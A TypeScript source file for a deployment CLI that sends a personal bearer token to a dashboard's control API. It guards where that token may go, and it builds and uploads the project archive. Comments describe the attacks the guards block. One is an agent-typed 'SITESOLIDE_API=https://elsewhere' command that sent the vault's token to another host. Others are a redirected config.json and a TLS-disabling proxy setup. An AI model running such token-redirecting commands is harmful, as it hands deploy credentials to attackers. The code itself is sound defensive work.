/**
 * The CLI without root SSH: a team member, or an agent in a sandbox, deploys
 * with a personal token over HTTPS, through the dashboard's control API.
 *
 *   sitesolide login --url https://dashboard.example.com
 *   sitesolide deploy      build here, upload, follow the machine's log
 *   sitesolide status      the projects this token may deploy
 *   sitesolide logs [--follow]
 *   sitesolide share [<email>...]   who may open the project, see access.ts
 *   sitesolide secrets [set|generate|remove|set-file|remove-file]
 *                                   the project's store of secrets, see store-cli.ts
 *   sitesolide restart              the project's service, and whether it holds
 *
 * **Which mode a command runs in.** A configuration with a `server` is the
 * owner's, and runs over SSH exactly as before: nothing here touches that path.
 * A configuration without one, but with the dashboard's address and a token,
 * is a team member's, and runs here. `--api` makes the owner use the API too,
 * to see what a team member sees.
 *
 * **The token is never in the configuration.** It lives in the workstation's
 * vault, `~/.config/sitesolide/secrets/team-token`, 0600, beside the other
 * credentials the workstation presents; `SITESOLIDE_TOKEN` in the environment
 * wins over it, for a sandbox that has no files to keep. The dashboard's
 * address is in config.json, under `api`, or in `SITESOLIDE_API`; the one the
 * vault's token was checked against is beside it, `team-token-api`, and the
 * vault's token goes nowhere else (boundAddress).
 *
 * **The token only ever goes to that address.** The archive is sent to
 * `<api>/api/v1/deployments/<id>/bundle`, built here, and never to an address
 * an answer names: a compromised or mistaken answer would otherwise receive
 * the bearer.
 *
 * The build stays on the workstation, as over SSH: the archive carries its
 * result, the code minus its exclusions in `app/`, and the public files in
 * `public/`. The machine installs dependencies itself, as the project's account.
 * The build's secrets are resolved here first, a missing one stopping the run
 * before anything is sent; the runtime secrets the store lacks are read before
 * the deployment, asked for at a terminal and warned of otherwise, never a
 * stop (see store-cli.ts).
 *
 * **An option this path does not carry is refused, never passed over.**
 * `deploy --dry-run` used to deploy for real here, and `--json` to print plain
 * text, so that the MCP tool's dry run replaced the live site and then
 * reported a failure inviting a retry. Both now behave as over SSH: `--json`
 * prints the same events and one final `result` or `error`, and a dry run is
 * refused, saying why, until the control API can judge without deploying.
 */
import { chmodSync, closeSync, constants, existsSync, fstatSync, lstatSync, mkdirSync, openSync, readdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { bundle, excludedBy, type BundleEntry } from "./bundle";
import { configPath, defaultPaths, expandHome, projectsRepo, readConfigFile } from "./config";
import { hintForFailure } from "./hints";
import { gatherBuildSecrets, missingBuildSecrets, sourceLine, unreadableWorkstation } from "./build-secrets";
import {
  hasServices,
  hasStore,
  isApp,
  mainPort,
  missingExclusions,
  NEVER_SENT,
  parserComplaint,
  readManifest,
  secretsOf,
  secretsWarnings,
  servicesOf,
  type Manifest,
  type SecretsDeclaration,
} from "./manifest";
import { eventFor, formatEvent, runsOf, type OutputEvent } from "./output";
import { share, SHARE_OPTIONS, type AccessState, type AccessTransport, type EntryAnswer, type Reading } from "./access";
import { sourceRefusal } from "./source";
import { workstationSecretsPath } from "./store";
import type { MissingIo, StoreTransport } from "./store-cli";
import type { StoreMissing } from "./store-protocol";

/** Where the token is kept in the vault. */
export const TOKEN_FILE = "team-token";

/**
 * Beside it, the dashboard `login` checked it against, the only address it
 * goes to: see boundAddress.
 */
export const TOKEN_ADDRESS_FILE = "team-token-api";

/** The limits the dashboard applies, checked here first so that a refusal comes before the upload. */
export const LIMITS = { bundleBytes: 100 * 1024 * 1024, extractedBytes: 512 * 1024 * 1024, entries: 20_000 };

export type Remote = { api: string; token: string };

type Environment = Record<string, string | undefined>;

/** The raw configuration file, the `api` key included, which `Config` does not carry. */
function rawConfig(home: string, environment: Environment): Record<string, unknown> {
  const path = configPath(home, environment);
  if (!existsSync(path)) return {};
  try {
    const parsed = JSON.parse(readFileSync(path, "utf8")) as unknown;
    return typeof parsed === "object" && parsed !== null && !Array.isArray(parsed) ? (parsed as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

/** The vault's folder, as the SSH path computes it: environment, file, default. */
export function vaultFolder(environment: Environment, home: string): string {
  const file = readConfigFile(home, environment);
  return expandHome(environment.SITESOLIDE_VAULT ?? file.vault ?? defaultPaths(home, environment).vault, home);
}

export function tokenPath(environment: Environment, home: string): string {
  return join(vaultFolder(environment, home), TOKEN_FILE);
}

/**
 * The dashboard's address, as an origin: https, or http on the loopback for a
 * local bench. null when it is not one.
 */
export function apiOrigin(raw: string): string | null {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return null;
  }
  const local = url.hostname === "localhost" || url.hostname === "127.0.0.1" || url.hostname === "[::1]";
  if (url.protocol !== "https:" && !(url.protocol === "http:" && local)) return null;
  if (url.username !== "" || url.password !== "") return null;
  return url.origin;
}

/**
 * Does this command run through the API? `--api` says so; otherwise a
 * configuration with a server is the owner's, and one with an API address and
 * no server is a team member's.
 */
export function remoteMode(arguments_: string[], environment: Environment, home = homedir()): boolean {
  if (arguments_.includes("--api")) return true;
  const file = rawConfig(home, environment);
  const server = environment.SITESOLIDE_SERVER ?? (typeof file.server === "string" ? file.server : "");
  if (server !== "") return false;
  const api = environment.SITESOLIDE_API ?? (typeof file.api === "string" ? file.api : "");
  return api !== "";
}

/** The address and the token, or what is missing, said with the command that fixes it. */
export function readRemote(environment: Environment, home = homedir()): Remote | { missing: string } {
  const file = rawConfig(home, environment);
  const raw = environment.SITESOLIDE_API ?? (typeof file.api === "string" ? file.api : "");
  const api = raw === "" ? null : apiOrigin(raw);
  if (api === null) {
    return { missing: raw === "" ? "no dashboard address: run sitesolide login --url https://dashboard.<zone>" : `not an https address: ${raw}` };
  }
  let token = environment.SITESOLIDE_TOKEN ?? "";
  if (token === "") {
    const vault = vaultFolder(environment, home);
    const path = join(vault, TOKEN_FILE);
    const kept = readVaultFile(path);
    if (kept.kind === "absent") return { missing: `no token in ${path}: run sitesolide login, or set SITESOLIDE_TOKEN` };
    if (kept.kind === "refused") return { missing: `${path} is a link or has another name: run sitesolide login, which writes the token there itself` };
    // The vault's token goes to the dashboard `login` checked it against,
    // and to no other: `SITESOLIDE_API=https://elsewhere sitesolide status`,
    // typed by an agent that read it somewhere, sent the bearer there, out of
    // a vault the agent itself may not read. A sandbox aims elsewhere with a
    // token of its own, SITESOLIDE_TOKEN beside it.
    const bound = boundAddress(vault);
    if (bound !== api) {
      const named = environment.SITESOLIDE_API !== undefined ? "SITESOLIDE_API" : "config.json";
      return { missing: `${named} names ${api}, not ${bound ?? "the address login wrote"}, the dashboard the token in the vault was checked against: run sitesolide login --url ${api}, or set SITESOLIDE_TOKEN beside it` };
    }
    token = kept.text.trim();
  }
  if (!/^sst_[A-Za-z0-9_-]{43}$/.test(token)) return { missing: "the token does not have the shape sst_...: ask the owner of the machine for a new one" };
  return { api, token };
}

/**
 * The one address the vault's token may go to, or null when none can be
 * trusted. Never the configuration the environment chooses: config.json is
 * no secret, an agent that may not read the vault may still write it or run
 * `sitesolide init --api`, and the environment picks which config.json is
 * read at all. `SITESOLIDE_CONFIG_DIR=/tmp/x`, or another `HOME`, with a
 * config.json there naming an attacker's `api` and the real vault, by its
 * `vault` key or SITESOLIDE_VAULT, made that `api` the one the real token
 * was compared with, and sent it there.
 *
 * The address `login` wrote in the vault beside the token, first: the vault
 * is the one folder the agent can neither read nor write.
 *
 * A vault `login` filled before it wrote the address holds none. Its token
 * goes where it always did, the `api` of the config.json `login` wrote then,
 * beside the vault's real folder, `secrets/`, whatever the environment
 * names: a vault elsewhere, with no configuration beside it, holds nothing
 * that says where its token was checked, and the answer is `sitesolide
 * login` again, which writes the address.
 */
function boundAddress(vault: string): string | null {
  const recorded = readVaultFile(join(vault, TOKEN_ADDRESS_FILE));
  if (recorded.kind === "present") return apiOrigin(recorded.text);
  if (recorded.kind === "refused") return null;
  try {
    const parsed = JSON.parse(readFileSync(join(dirname(realpathSync(vault)), "config.json"), "utf8")) as { api?: unknown } | null;
    return typeof parsed?.api === "string" ? apiOrigin(parsed.api) : null;
  } catch {
    return null;
  }
}

type VaultRead = { kind: "absent" } | { kind: "refused" } | { kind: "present"; text: string };

/**
 * A file the vault's token depends on, read only when it is a plain file with
 * a single name, judged on the descriptor that reads it. A vault folder the
 * environment names is anyone's to fill: a link there, or a second name
 * given to the real token, put that token in a vault whose address someone
 * else wrote.
 */
function readVaultFile(path: string): VaultRead {
  let fd: number;
  try {
    fd = openSync(path, constants.O_RDONLY | constants.O_NOFOLLOW | constants.O_NONBLOCK);
  } catch (error) {
    return (error as NodeJS.ErrnoException).code === "ENOENT" ? { kind: "absent" } : { kind: "refused" };
  }
  try {
    const info = fstatSync(fd);
    if (!info.isFile() || info.nlink !== 1 || info.size > 64 * 1024) return { kind: "refused" };
    return { kind: "present", text: readFileSync(fd, "utf8") };
  } finally {
    closeSync(fd);
  }
}

// --- talking to the API ------------------------------------------------------------

export type Failure = { error: string; message: string; details?: string[]; wait?: number };
export type Answer<T> = { ok: true; status: number; body: T } | { ok: false; status: number; failure: Failure };

export type Fetch = (input: string, init?: BunFetchRequestInit) => Promise<Response>;

/** One call: the bearer, JSON back, every failure said in the API's own words. */
export async function call<T>(remote: Remote, path: string, init: RequestInit = {}, fetcher: Fetch = fetch): Promise<Answer<T>> {
  let response: Response;
  try {
    response = await fetcher(`${remote.api}${path}`, {
      ...init,
      redirect: "error",
      headers: { Authorization: `Bearer ${remote.token}`, ...(init.headers ?? {}) },
      // The certificate is checked whatever the environment says: Bun's
      // fetch obeys NODE_TLS_REJECT_UNAUTHORIZED=0, and HTTPS_PROXY beside it
      // let the proxy answer the handshake itself and read the bearer.
      tls: { rejectUnauthorized: true },
    });
  } catch (error) {
    return { ok: false, status: 0, failure: { error: "unreachable", message: `${remote.api} unreachable: ${(error as Error).message}` } };
  }
  let body: unknown;
  try {
    body = await response.json();
  } catch {
    return { ok: false, status: response.status, failure: { error: "unreadable", message: `${remote.api} answered ${response.status} with something that is not the control API` } };
  }
  if (response.ok) return { ok: true, status: response.status, body: body as T };
  const failure = body as Partial<Failure>;
  return {
    ok: false,
    status: response.status,
    failure: {
      error: typeof failure.error === "string" ? failure.error : "failure",
      message: typeof failure.message === "string" ? failure.message : `${remote.api} answered ${response.status}`,
      ...(Array.isArray(failure.details) ? { details: failure.details.map(String) } : {}),
      ...(typeof failure.wait === "number" ? { wait: failure.wait } : {}),
    },
  };
}

/**
 * What the commands print, for a person or, under `--json`, for a program, as
 * bin/sitesolide.ts does over SSH: see bin/cli/output.ts.
 *
 * `say` is a line of the run, `journal` a line of a service's journal.
 * `failed` and `succeeded` end the run, and are what `--json` is for: exactly
 * one `error`, with its hint, or one `result`, with what the run concluded,
 * always the last line. Without them an agent read the plain console text,
 * and a deploy that went wrong looked like one that said nothing.
 */
export type Output = {
  say: (line: string) => void;
  journal: (line: string) => void;
  /** Something wrong that stops nothing, with its details: a `warning` event under --json. */
  warn?: (message: string, details: string[]) => void;
  /** `said`: a person already read the message, in the machine's log. */
  failed: (failure: Failure, said?: boolean) => void;
  succeeded: (command: string, fields: Record<string, unknown>) => void;
};

export const humanOutput: Output = {
  say: (line) => console.log(line),
  journal: (line) => console.log(line),
  warn: (message, details) => {
    console.error(`!! ${message}`);
    for (const detail of details) console.error(`   ${detail}`);
  },
  failed: (failure, said = false) => {
    if (said) return;
    console.error(`!! ${failure.message}`);
    for (const detail of failure.details ?? []) console.error(`   ${detail}`);
    if (failure.wait !== undefined) console.error(`   wait ${failure.wait} s`);
  },
  succeeded: () => {},
};

/** The events of `--json`, one per line on standard output, and nothing else. */
export function eventOutput(write: (line: string) => void = (line) => console.log(line)): Output {
  const emit = (event: OutputEvent): void => write(formatEvent(event));
  return {
    say: (line) => {
      const event = eventFor(line);
      if (event !== null) emit(event);
    },
    journal: (line) => emit({ type: "log", at: null, unit: null, priority: null, message: line }),
    warn: (message, details) => emit({ type: "warning", message, details }),
    failed: (failure) =>
      emit({
        type: "error",
        message: failure.message,
        details: [...(failure.details ?? []), ...(failure.wait === undefined ? [] : [`wait ${failure.wait} s`])],
        hint: hintForFailure(failure.error, failure.message),
      }),
    succeeded: (command, fields) => emit({ type: "result", ok: true, command, ...fields }),
  };
}

function report(output: Output, failure: Failure): number {
  output.failed(failure);
  return 1;
}

// --- the project, read for the API ------------------------------------------------

export type RemoteProject = { folder: string; code: string; manifest: Manifest; raw: string };

/**
 * The manifest as the API will judge it: `validate()` of the CLI, except that
 * a missing port is not an error, the machine choosing one. Missing ports are
 * filled with stand-ins for the check alone; the text sent is the file's.
 *
 * Only a public service gets one. An internal service without a port is a
 * worker, which listens on nothing, and a scheduled one may not have a port
 * at all: a stand-in would make the first a server and the second refused.
 */
export function checkManifest(raw: string): { manifest?: Manifest; errors: string[] } {
  let object: unknown;
  try {
    object = JSON.parse(raw);
  } catch (error) {
    return { errors: [`sitesolide.json is unreadable: ${parserComplaint(error)}`] };
  }
  if (typeof object !== "object" || object === null || Array.isArray(object)) return { errors: ["sitesolide.json must contain an object"] };
  const filled: Record<string, unknown> = { ...(object as Record<string, unknown>) };
  if (typeof filled.services === "object" && filled.services !== null && !Array.isArray(filled.services)) {
    const services: Record<string, unknown> = {};
    let next = 3000;
    for (const [name, service] of Object.entries(filled.services as Record<string, unknown>)) {
      const standIn =
        typeof service === "object" && service !== null && !Array.isArray(service) && !("port" in service) && !("schedule" in service) && (service as { internal?: unknown }).internal !== true;
      services[name] = standIn ? { ...service, port: next++ } : service;
    }
    filled.services = services;
  } else if (typeof filled.start === "string" && !("port" in filled)) {
    filled.port = 3000;
  }
  const { errors } = readManifest(JSON.stringify(filled));
  return errors.length > 0 ? { errors } : { manifest: object as Manifest, errors: [] };
}

export function readRemoteProject(folder: string): RemoteProject | { errors: string[] } {
  const path = join(folder, "sitesolide.json");
  if (!existsSync(path)) return { errors: [`sitesolide.json not found in ${folder}`] };
  const raw = readFileSync(path, "utf8");
  const { manifest, errors } = checkManifest(raw);
  if (manifest === undefined || errors.length > 0) return { errors: ["sitesolide.json rejected", ...errors] };
  const code = manifest.source === undefined ? folder : resolve(folder, manifest.source);
  if (!existsSync(code) || !lstatSync(code).isDirectory()) return { errors: [`source not found: ${manifest.source} (${code})`] };
  // As over SSH: outside the sites repository, source stays inside its own, see source.ts.
  let sitesRepo: string | null = null;
  try {
    sitesRepo = projectsRepo();
  } catch {
    sitesRepo = null;
  }
  const escape = manifest.source === undefined ? null : sourceRefusal(folder, code, sitesRepo);
  if (escape !== null) return { errors: [escape, "a manifest outside your sites repository may only point inside its own repository: nothing was built nor sent"] };
  const missing = isApp(manifest) ? missingExclusions(manifest, readdirSync(code)) : [];
  if (missing.length > 0) {
    return { errors: [`exclude: ${missing.join(", ")} present on disk and not excluded`, `add "exclude": [${missing.map((name) => `"${name}"`).join(", ")}] to the manifest`] };
  }
  return { folder, code, manifest, raw };
}

/**
 * The entries of one tree, `prefix/...`, without what the patterns exclude.
 * A link or a special file is refused: the machine refuses them, and saying so
 * here names the file.
 */
export function collect(root: string, prefix: string, patterns: readonly string[]): { entries: BundleEntry[]; refused: string[] } {
  const entries: BundleEntry[] = [];
  const refused: string[] = [];
  const visit = (folder: string, relative: string) => {
    for (const name of readdirSync(folder).sort()) {
      const path = join(folder, name);
      const inner = relative === "" ? name : `${relative}/${name}`;
      const stat = lstatSync(path);
      if (excludedBy(inner, stat.isDirectory(), patterns)) continue;
      const mtime = Math.floor(stat.mtimeMs / 1000);
      if (stat.isSymbolicLink()) refused.push(`${prefix}/${inner} is a symbolic link`);
      else if (stat.isDirectory()) {
        entries.push({ kind: "directory", path: `${prefix}/${inner}`, mtime });
        visit(path, inner);
      } else if (stat.isFile()) {
        entries.push({ kind: "file", path: `${prefix}/${inner}`, mtime, executable: (stat.mode & 0o111) !== 0, content: readFileSync(path) });
      } else refused.push(`${prefix}/${inner} is not a regular file`);
    }
  };
  entries.push({ kind: "directory", path: prefix, mtime: Math.floor(lstatSync(root).mtimeMs / 1000) });
  visit(root, "");
  return { entries, refused };
}

/**
 * What leaves, as rsync would have sent it: the code into `app/`, minus its
 * exclusions, the manifest and the public files; the public files into
 * `public/`. Neither tree carries `.git` nor a `.env`, at any depth: see
 * NEVER_SENT.
 */
export function projectEntries(project: RemoteProject): { entries: BundleEntry[]; refused: string[] } {
  const { manifest } = project;
  const entries: BundleEntry[] = [];
  const refused: string[] = [];
  if (isApp(manifest)) {
    const patterns = [...(manifest.exclude ?? []), ...NEVER_SENT, "sitesolide.json", ...(manifest.publicDir === undefined ? [] : [manifest.publicDir])];
    const app = collect(project.code, "app", patterns);
    entries.push(...app.entries);
    refused.push(...app.refused);
  }
  if (manifest.publicDir !== undefined) {
    const files = collect(join(project.code, manifest.publicDir), "public", NEVER_SENT);
    entries.push(...files.entries);
    refused.push(...files.refused);
  }
  return { entries, refused };
}

// --- the commands -------------------------------------------------------------------

export type RemoteDependencies = {
  folder: string;
  environment: Environment;
  home?: string;
  fetcher?: Fetch;
  output?: Output;
  /**
   * The build of bin/sitesolide.ts, which runs the manifest's `build` here,
   * in the clean environment of buildEnv: the build secrets resolved, and
   * what `{zone}` and `{contact}` become in the manifest's `env`.
   */
  build: (project: RemoteProject, context: BuildContext) => Promise<void>;
  /** Its check that the public folder exists and is not empty. */
  checkPublic: (project: RemoteProject) => void;
  /** Between two reads of a deployment's progress. */
  pause?: () => Promise<void>;
  prompt?: (question: string) => string | null;
  stdin?: () => Promise<string>;
  /** A secret's value typed without echo, null when the typing was abandoned, a refusal for a key it does not take: `promptWithoutEcho` by default. */
  secretPrompt?: (question: string) => Promise<Typed>;
  /** Whether standard input is a terminal, where a person types and `--stdin` would echo: its `isTTY` by default. */
  terminal?: () => boolean;
  /** Whether standard output is one too: deploy asks for a missing secret only when both are. Its `isTTY` by default. */
  outputTerminal?: () => boolean;
  /** All of standard input, as bytes: `secrets set --stdin` and `secrets set-file`. */
  stdinBytes?: () => Promise<Uint8Array>;
};

/** What a project's build receives besides the workstation's allow list: see buildEnv in ./kit. */
export type BuildContext = { secrets: Record<string, string>; placeholders: { slug: string; zone: string; contact: string } };

type DeploymentView = {
  id: string;
  slug: string;
  state: string;
  creating: boolean;
  log: string[];
  next: number;
  error: { code: string; message: string } | null;
  url: string | null;
  allocated: { service: string | null; port: number }[];
  /** What {zone} and {contact} become for the build here; absent from a dashboard before the store. */
  placeholders?: { zone: string; contact: string };
  /** Declared runtime names and files the store lacked once the installer was done; absent before the store. */
  missingSecrets?: StoreMissing | null;
};

/** `member`: the dashboard's member whose own token it is, narrowed to their roles; absent from a dashboard before them. */
type Identity = {
  id: string;
  label: string;
  email: string;
  expiresAt: number | null;
  /** `secrets`: absent from a dashboard before the permission, which reads as without it. */
  scope: { slugs: string[]; create: boolean; outbound: boolean; domain: boolean; public: boolean; secrets?: boolean };
  owned: string[];
  member?: string | null;
};

/** The token held, said in one line: who, and what it may do. */
export function describeIdentity(identity: Identity): string[] {
  const may = [
    identity.scope.create ? "create projects" : null,
    // A member's token deploys its projects behind the door they have, and opens none without the option.
    identity.scope.public ? "deploy public sites" : typeof identity.member === "string" ? "open no site to the public" : "deploy private sites only",
    identity.scope.outbound ? "use network: outbound" : null,
    identity.scope.domain ? "declare a domain" : null,
    identity.scope.secrets === true ? "manage secrets" : null,
  ].filter((part): part is string => part !== null);
  const projects = [...new Set([...identity.owned, ...identity.scope.slugs])].sort();
  return [
    `   ${identity.email} (${identity.label}), token ${identity.id}`,
    `   may ${may.join(", ")}`,
    `   projects: ${projects.length === 0 ? "none yet" : projects.join(", ")}`,
    ...(identity.expiresAt === null ? [] : [`   expires ${new Date(identity.expiresAt).toISOString().slice(0, 10)}`]),
    ...(typeof identity.member === "string" ? [`   a personal token: never more than ${identity.member}'s roles on the dashboard, read at every request`] : []),
  ];
}

export async function login(arguments_: string[], dependencies: Omit<RemoteDependencies, "build" | "checkPublic" | "folder">): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const home = dependencies.home ?? homedir();
  const environment = dependencies.environment;
  const refused = unknownOptions("login", arguments_);
  if (refused !== null) return report(output, refused);
  // Under --json nothing prompts: the question would land on standard output
  // among the events, and the answer never come from an agent's empty stdin.
  const interactive = !arguments_.includes("--json");
  const ask = (question: string): string => (interactive ? ((dependencies.prompt ?? prompt)(question) ?? "") : "");
  const value = (name: string) => {
    const marker = arguments_.indexOf(`--${name}`);
    return marker === -1 ? undefined : arguments_[marker + 1];
  };
  const raw = value("url") ?? environment.SITESOLIDE_API ?? ask("Dashboard address, https://dashboard.<zone>:");
  const api = apiOrigin(raw);
  if (api === null) return report(output, { error: "invalid", message: `not an https address: ${raw || "nothing given"}` });

  let token = environment.SITESOLIDE_TOKEN ?? "";
  if (arguments_.includes("--token-stdin")) token = (await (dependencies.stdin ?? (() => Bun.stdin.text()))()).trim();
  if (token === "" && interactive && (dependencies.terminal ?? (() => process.stdin.isTTY === true))()) {
    // At a terminal, without echo, as `secrets set` reads a value: the
    // token typed at `prompt` stayed on the screen and in the scrollback,
    // a credential that deploys and sets secrets, shown to whoever looks.
    const typed = await (dependencies.secretPrompt ?? promptWithoutEcho)("Token, sst_..., as the owner of the machine gave it (no echo): ");
    if (typed === null) return report(output, { error: "cancelled", message: "nothing typed: nothing was written" });
    if (typeof typed !== "string") return report(output, { error: "invalid", message: `${typed.refused}: nothing was written` });
    token = typed.trim();
  }
  if (token === "") token = ask("Token, sst_..., as the owner of the machine gave it:").trim();
  if (!/^sst_[A-Za-z0-9_-]{43}$/.test(token)) return report(output, { error: "invalid", message: "this is not a sitesolide token: it starts with sst_ and is 47 characters long" });

  const remote = { api, token };
  const answer = await call<{ identity: Identity }>(remote, "/api/v1/whoami", {}, dependencies.fetcher);
  if (!answer.ok) return report(output, answer.failure);

  const vault = vaultFolder(environment, home);
  mkdirSync(vault, { recursive: true, mode: 0o700 });
  const path = join(vault, TOKEN_FILE);
  writeFileSync(path, `${token}\n`, { mode: 0o600 });
  chmodSync(path, 0o600);
  // The address the token was just checked against, beside it in the vault,
  // and the only one readRemote sends it to: see boundAddress.
  const address = join(vault, TOKEN_ADDRESS_FILE);
  writeFileSync(address, `${api}\n`, { mode: 0o600 });
  chmodSync(address, 0o600);
  const file = rawConfig(home, environment);
  mkdirSync(dirname(configPath(home, environment)), { recursive: true });
  writeFileSync(configPath(home, environment), `${JSON.stringify({ ...file, api }, null, 2)}\n`);

  output.say(`-> signed in to ${api}`);
  for (const line of describeIdentity(answer.body.identity)) output.say(line);
  output.say(`   token kept in ${path}, address in ${configPath(home, environment)}`);
  if (typeof file.server === "string" && file.server !== "") output.say("   this workstation also has a server: commands use SSH unless given --api");
  output.succeeded("login", { api, identity: answer.body.identity, tokenFile: path });
  return 0;
}

/**
 * What `{zone}` and `{contact}` become for the build: the deployment's own
 * answer, or, from a dashboard before it sends them, the zone the dashboard's
 * address names, `dashboard.<zone>`, and no contact. A placeholder that
 * cannot be filled stays in place, visible, as the unit generator leaves it.
 */
export function buildPlaceholders(slug: string, api: string, given: { zone?: unknown; contact?: unknown } | undefined): BuildContext["placeholders"] {
  if (given !== undefined && typeof given.zone === "string" && typeof given.contact === "string") return { slug, zone: given.zone, contact: given.contact };
  const host = new URL(api).hostname;
  return { slug, zone: host.startsWith("dashboard.") ? host.slice("dashboard.".length) : "", contact: "" };
}

/** Says a warning, with its details: the output's own way when it has one, its lines otherwise. */
function warnOn(output: Output, message: string, details: string[]): void {
  if (output.warn !== undefined) return output.warn(message, details);
  output.say(`!! ${message}`);
  for (const detail of details) output.say(`   ${detail}`);
}

async function deploy(remote: Remote, dependencies: RemoteDependencies, json: boolean): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const read = readRemoteProject(dependencies.folder);
  if ("errors" in read) {
    const [first, ...rest] = read.errors;
    return report(output, { error: "invalid", message: first ?? "sitesolide.json rejected", details: rest });
  }
  const project = read;
  const { manifest } = project;
  const slug = manifest.slug;
  output.say(`-> project ${slug}, through ${remote.api}`);
  for (const warning of secretsWarnings(manifest)) warnOn(output, warning, []);

  // The build's secrets first, from whoever deploys: a missing one stops
  // here, before anything is sent, the manifest included.
  const declaration = secretsOf(manifest);
  const workstation = workstationSecretsPath(vaultFolder(dependencies.environment, dependencies.home ?? homedir()), slug);
  const resolved = await gatherBuildSecrets(declaration.build, dependencies.environment, workstation);
  if (resolved.refusal !== null) return report(output, { error: "build-secrets-unreadable", ...unreadableWorkstation(workstation, resolved.refusal) });
  if (resolved.missing.length > 0) return report(output, { error: "build-secret-missing", ...missingBuildSecrets(resolved.missing, workstation) });
  for (const { name, source } of resolved.sources) output.say(`   ${sourceLine(name, source, workstation)}`);

  // The runtime secrets the store lacks, before anything is sent: asked for
  // at a terminal, warned of otherwise. Never a stop.
  const store = await import("./store-cli");
  const transport = store.apiStore(remote, dependencies.fetcher);
  const io: MissingIo = {
    terminal: (dependencies.terminal ?? (() => process.stdin.isTTY === true))() && (dependencies.outputTerminal ?? (() => process.stdout.isTTY === true))(),
    json,
    ask: async (question) => (dependencies.prompt ?? prompt)(question),
    secret: dependencies.secretPrompt ?? promptWithoutEcho,
    say: (line) => output.say(line),
    warn: (message, details) => warnOn(output, message, details),
  };
  const declares = hasStore(manifest) && (declaration.runtime.length > 0 || declaration.files.length > 0);
  let missing: StoreMissing | null = declares ? null : { runtime: [], files: [] };
  let deferred = false;
  if (declares) {
    output.say("-> runtime secrets");
    const listed = await transport.list(slug);
    if (listed.ok) {
      missing = await store.handleMissing(store.withDeclared(listed.value, declaration), transport, io);
      if (missing.runtime.length === 0 && missing.files.length === 0) output.say("   every declared runtime secret is set");
    } else if (listed.failure.error === "out-of-scope") {
      output.say("   this token may not list secrets: the machine's log names any that is missing");
    } else if (listed.failure.error === "not-found") {
      // A project not deployed yet whose store this token may not hold
      // ahead: what it lacks is asked for once the deployment made it.
      deferred = true;
      output.say("   not deployed yet: what its store lacks is said once the deployment is done");
    } else warnOn(output, `cannot tell which runtime secrets are set: ${listed.failure.message}`, []);
  }

  // The manifest first: the dashboard and the steward judge it, so that a
  // refusal comes back before the build and the upload.
  const created = await call<{ deployment: DeploymentView }>(
    remote,
    "/api/v1/deployments",
    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ manifest: project.raw }) },
    dependencies.fetcher,
  );
  if (!created.ok) return report(output, created.failure);
  const deployment = created.body.deployment;
  output.say(`   deployment ${deployment.id}${deployment.creating ? ", a new project" : ""}`);

  await dependencies.build(project, { secrets: resolved.values, placeholders: buildPlaceholders(slug, remote.api, deployment.placeholders) });
  dependencies.checkPublic(project);

  output.say("-> archive");
  const { entries, refused } = projectEntries(project);
  if (refused.length > 0) {
    return report(output, { error: "invalid", message: "the machine refuses links and special files in the archive", details: [...refused.slice(0, 10), "replace them with the files they point to, or exclude them in sitesolide.json"] });
  }
  const files = entries.filter((entry) => entry.kind === "file");
  const bytes = files.reduce((sum, entry) => sum + (entry.kind === "file" ? entry.content.length : 0), 0);
  if (entries.length > LIMITS.entries || bytes > LIMITS.extractedBytes) {
    return report(output, { error: "too-large", message: `${entries.length} entries, ${bytes} bytes: over what the machine accepts (${LIMITS.entries} entries, 512 MiB)`, details: ["exclude dependencies and caches in sitesolide.json: the machine installs dependencies itself"] });
  }
  const archive = bundle(entries);
  if (archive.length > LIMITS.bundleBytes) return report(output, { error: "too-large", message: `the archive is ${archive.length} bytes compressed, over 100 MiB` });
  output.say(`   ${files.length} file(s), ${bytes} bytes, ${archive.length} compressed`);

  output.say("-> upload");
  const uploaded = await call<{ deployment: DeploymentView }>(
    remote,
    `/api/v1/deployments/${deployment.id}/bundle`,
    { method: "PUT", headers: { "Content-Type": "application/gzip" }, body: archive },
    dependencies.fetcher,
  );
  if (!uploaded.ok) return report(output, uploaded.failure);

  // The machine's log, as it is written, until the end.
  let next = 0;
  const pause = dependencies.pause ?? (() => Bun.sleep(1000));
  for (;;) {
    const read = await call<{ deployment: DeploymentView }>(remote, `/api/v1/deployments/${deployment.id}?after=${next}`, {}, dependencies.fetcher);
    if (!read.ok) {
      if (read.failure.error === "unreachable") {
        await pause();
        continue;
      }
      return report(output, read.failure);
    }
    const view = read.body.deployment;
    for (const line of view.log) output.say(line);
    next = view.next;
    if (view.state === "succeeded") {
      for (const { service, port } of view.allocated) {
        output.say(`   the machine chose port ${port}${service === null ? "" : ` for ${service}`}: write it in sitesolide.json to keep it explicit`);
      }
      // What the installer found missing once done is the word that counts;
      // a dashboard before it says nothing, and the reading before stands.
      let missingSecrets: StoreMissing | null = view.missingSecrets !== undefined ? view.missingSecrets : missing;
      if (deferred && io.terminal && !json) missingSecrets = await askAfterCreation(slug, declaration, transport, io, store, output);
      const main = view.allocated.find((entry) => entry.service === null) ?? view.allocated[0];
      output.succeeded("deploy", {
        slug,
        kind: isApp(manifest) ? (hasServices(manifest) ? "services" : "service") : "static",
        ...(isApp(manifest) ? { runs: runsOf(servicesOf(manifest)) } : {}),
        dryRun: false,
        port: main?.port ?? mainPort(manifest),
        ...(view.allocated.length > 0 ? { portChosen: "free" } : {}),
        manifestWritten: false,
        url: view.url,
        deployment: deployment.id,
        creating: deployment.creating,
        missingSecrets,
        buildSecrets: resolved.sources,
      });
      return 0;
    }
    if (view.state === "failed" || view.state === "expired") {
      const error = view.error ?? { code: view.state === "expired" ? "expired" : "failure", message: `the deployment ended ${view.state}` };
      // A person already read the message in the machine's log; an agent
      // still gets it as the final event, with its hint.
      output.failed({ error: error.code, message: error.message }, view.log.some((line) => line.includes(error.message)));
      return 1;
    }
    await pause();
  }
}

/**
 * The prompts of a first deployment whose store the token could not hold
 * ahead, now that the deployment made the project: then one restart offered,
 * so that the service reads what was set. What is left missing is returned.
 */
async function askAfterCreation(
  slug: string,
  declaration: SecretsDeclaration,
  transport: StoreTransport,
  io: MissingIo,
  store: typeof import("./store-cli"),
  output: Output,
): Promise<StoreMissing | null> {
  output.say("-> runtime secrets, now that the project exists");
